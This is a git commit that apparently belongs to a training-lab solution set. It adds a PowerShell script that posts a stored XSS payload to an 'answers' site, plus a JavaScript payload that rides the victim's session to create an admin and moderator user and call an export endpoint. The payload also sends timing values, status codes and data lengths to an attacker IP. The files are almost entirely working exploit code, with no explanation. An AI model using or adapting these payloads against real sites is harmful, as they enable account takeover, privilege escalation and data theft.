08cac49219f37773b238110846990ef6645fa162
zinhart <aromzinhartdegraca@gmail.com>
2023-02-23 10:14:48 -0800

    Password Bruteforce now working, we have to add a couple seconds in order to make sure there is a wide enough range to bruteforce the seed.

---
+++ answers/auth-bypass-via-csrf/create-admin-usr.ps1
@@ -0,0 +1,2 @@
+$xss_payload = "`"><script src='http://192.168.119.123/create-user-csrf.js'></script>"
+Invoke-WebRequest -Uri "http://answers/question" -Method POST -body "title=hax&description=$xss_payload&category=1"
---
+++ answers/auth-bypass-via-csrf/create-user-csrf.js
@@ -0,0 +1,63 @@
+const attacker_ip = '192.168.119.123';
+/*var h1s = document.getElementsByTagName("h1");
+fetch(`http://${attacker_ip}/`+h1s[1].textContent, {});
+*/
+const host = 'answers';
+const host_ip = '192.168.123.251';
+
+username = "zinhart"
+email = "zinhart@cucked.com"
+isAdmin = "true"
+isMod = "true"
+let config = {
+      "method":"POST",
+      "credentials":"include",
+      mode: "cors",
+      headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+      },
+      body: "name=" + encodeURIComponent(username) + "&email=" + encodeURIComponent(email) + "&isAdmin=" + encodeURIComponent(isAdmin) + "&isMod=" + encodeURIComponent(isMod)
+  };
+
+  /// Create an Admin user and seed values to crack the users password
+let start = Date.now();
+doRequest(`http://${host_ip}/admin/users/create`, config);
+let end = Date.now();
+
+fetch(`http://${attacker_ip}/?start_time=` + start, {
+  mode: "cors",
+});
+
+fetch(`http://${attacker_ip}/?end_time=` + end, {
+  mode: "cors",
+});
+
+doRequest(`http://${host_ip}/admin/export`, config);
+
+
+
+
+
+
+// Helper Functions
+// very basic
+function doRequest(endpoint, cfg) {
+  fetch(endpoint, cfg).then(async (response) => {
+      fetch(`http://${attacker_ip}/?endpoint=` + endpoint, {
+        mode: "cors",
+      });   
+      fetch(`http://${attacker_ip}/?status_code=` + response.status, {
+        mode: "cors",
+      });
+    if(response.status < 400) {
+      let data = await response.text();
+      fetch(`http://${attacker_ip}/?exfil=` + data.length, {
+        mode: "cors",
+      });
+    }
+  }).catch((error) => {
+       fetch(`http://${attacker_ip}/?error=` + error, {
+        mode: "cors",
+      });   
+  });
+}
